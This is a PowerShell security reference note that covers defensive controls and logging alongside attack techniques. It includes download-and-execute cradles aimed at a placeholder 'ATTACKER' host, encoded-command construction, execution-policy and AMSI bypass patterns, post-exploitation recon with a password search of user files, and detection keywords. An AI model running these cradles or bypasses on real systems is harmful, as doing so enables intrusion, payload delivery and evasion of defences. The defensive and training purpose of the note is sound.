---
title: PowerShell Security Reference
tags:
  - reference
  - PowerShell
  - AMSI
  - bypass
  - constrained-language
  - security
  - windows
  - intermediate
created: 2026-03-26
updated: 2026-03-26
difficulty: intermediate
---

# ⚡ PowerShell Security Reference

## Why PowerShell Matters in Security
PowerShell is deeply integrated into Windows and is heavily abused by attackers (living-off-the-land). Defenders must understand its security controls; red teamers must know how to work within them.

---

## PowerShell Security Features

### 1. Execution Policy
Controls which scripts can run. **Not a security boundary** — easily bypassed.

```powershell
# Check current policy
Get-ExecutionPolicy
Get-ExecutionPolicy -List    # Per scope

# Common policies:
# Restricted     — No scripts (default on workstations)
# RemoteSigned   — Downloaded scripts need signature
# Unrestricted   — All scripts run
# Bypass         — Nothing blocked

# Bypass methods (not for malicious use — for testing):
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
```

### 2. Constrained Language Mode (CLM)
Restricts PowerShell to basic language elements. Blocks: Add-Type, .NET reflection, COM objects, custom classes, certain providers.

```powershell
# Check language mode
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = unrestricted
# ConstrainedLanguage = CLM active (common in AppLocker / WDAC environments)

# What CLM blocks:
# - Add-Type
# - [System.Reflection.Assembly]::Load()
# - .NET type accelerators for custom types
# - COM object creation via New-Object -ComObject
```

**Bypass attempts (for authorized testing):**
- PowerShell 2.0 downgrade (`powershell -version 2`) — often mitigated by disabling PSv2
- Custom runspace via C# (if code execution exists)

### 3. AMSI (Antimalware Scan Interface)
AMSI hooks PowerShell (and other scripting engines) to scan scripts before execution. All major AV/EDR vendors integrate with AMSI.

**What AMSI scans:**
- Every PowerShell command block
- Script content before execution
- `Invoke-Expression`, `IEX`, encoded commands

```powershell
# AMSI testing (legitimate research context):
# Test if AMSI is active:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# Common AMSI bypass patterns (for lab/research — flagged by EDR in production):
# These are intentionally fragmented to avoid triggering:
# String concatenation: 'Am'+'siScan'+'Buffer'
# Reflection to patch amsi.dll in memory
# SetPreference to disable (requires admin or CLM bypass first)
```

### 4. Script Block Logging (Event ID 4104)
Logs all PowerShell script block content, including decoded commands. Even if attacker encodes commands, PSv5+ de-obfuscates and logs the decoded version.

**Enable (Blue Team):**
```powershell
# GPO: Computer Config → Admin Templates → Windows Components → Windows PowerShell
# Enable: Turn on PowerShell Script Block Logging ✅
# Enable: Log script block invocation start/stop events ✅

# Check in registry:
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

**Detect encoded commands in logs:**
```
Event ID 4104 — "Creating Scriptblock text"
Look for: -EncodedCommand, Invoke-Expression, DownloadString, WebClient, bypass
```

### 5. Module Logging (Event ID 4103)
Logs pipeline execution details — input/output of every module used.

### 6. Transcription Logging
Saves all PS input/output to a text file. Very verbose but useful for forensics.

```powershell
# Enable transcription:
Start-Transcript -Path C:\Logs\ps_transcript.txt -Append
```

---

## Common PowerShell Attack Techniques

### Download Cradles
```powershell
# Download and execute in memory (no disk write)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file.exe','C:\Temp\file.exe')

# BITS transfer (stealthier)
Start-BitsTransfer -Source http://ATTACKER/file.exe -Destination C:\Temp\file.exe

# Invoke-WebRequest
Invoke-WebRequest -Uri http://ATTACKER/file.exe -OutFile C:\Temp\file.exe
iwr http://ATTACKER/script.ps1 -UseBasicParsing | IEX

# curl/wget aliases
curl http://ATTACKER/file.exe -o file.exe
wget http://ATTACKER/file.exe -o file.exe
```

### Encoded Commands
```powershell
# Encode a command (run on attacker machine):
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
Write-Output $encoded

# Execute encoded command on target:
powershell -EncodedCommand BASE64STRING
powershell -enc BASE64STRING
powershell -e BASE64STRING
```

### Invoke-Expression Variants
```powershell
IEX "whoami"
& ([scriptblock]::Create("whoami"))
Invoke-Expression "whoami"
$sb = [ScriptBlock]::Create("whoami"); & $sb
```

---

## PowerShell for Recon (Post-Exploitation)

```powershell
# System info
$env:COMPUTERNAME; $env:USERNAME; $env:USERDOMAIN
[System.Environment]::OSVersion.VersionString
(Get-WmiObject Win32_ComputerSystem).Domain

# Network info
ipconfig /all
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# Current user privileges
whoami /priv
whoami /groups

# Local users and groups
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# Running processes
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20

# Installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# Scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, TaskPath

# Services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Recent files
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)}

# Search for passwords in files
Select-String -Path C:\Users\*\*.txt -Pattern "password" -ErrorAction SilentlyContinue
```

---

## PowerShell for AD Enumeration

```powershell
# Without BloodHound — native AD module (requires RSAT)
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Domain Admins"
Get-ADComputer -Filter * | Select-Object Name,DNSHostName

# PowerView (preferred — no RSAT needed)
# Load into memory: IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')
Get-NetDomain
Get-NetDomainController
Get-NetUser | Select-Object samaccountname,description
Get-NetGroup | Select-Object name
Get-NetGroupMember -GroupName "Domain Admins"
Find-LocalAdminAccess        # Find machines current user has local admin on
Invoke-ACLScanner            # Find abusable ACLs
```

---

## Blue Team: PowerShell Hardening

```powershell
# Disable PowerShell v2 (prevents downgrade attack)
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

# Enable all logging (GPO preferred)
# Script Block Logging: HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
# EnableScriptBlockLogging = 1
# Module Logging: EnableModuleLogging = 1

# Configure constrained language mode via AppLocker/WDAC

# Restrict PowerShell access (if not needed for users)
# Use AppLocker to block powershell.exe for non-admins
# Block powershell_ise.exe, pwsh.exe (PS 7)
```

---

## Key Event IDs to Monitor

| Event ID | Source | Description |
|---|---|---|
| 4103 | PowerShell | Module logging (pipeline execution) |
| 4104 | PowerShell | Script block logging — **critical** |
| 4105/4106 | PowerShell | Script start/stop |
| 4688 | Security | Process creation (detect powershell.exe spawns) |
| 400/403/800 | PowerShell | Engine lifecycle events |

---

## Related Notes
- Windows-Commands
- AD-Attack-Reference
- Active-Directory
- Reverse-Shell-Cheatsheet
- Network-Defense-Blue-Team
- Evil-WinRM

---
<- [[Reference-MOC]]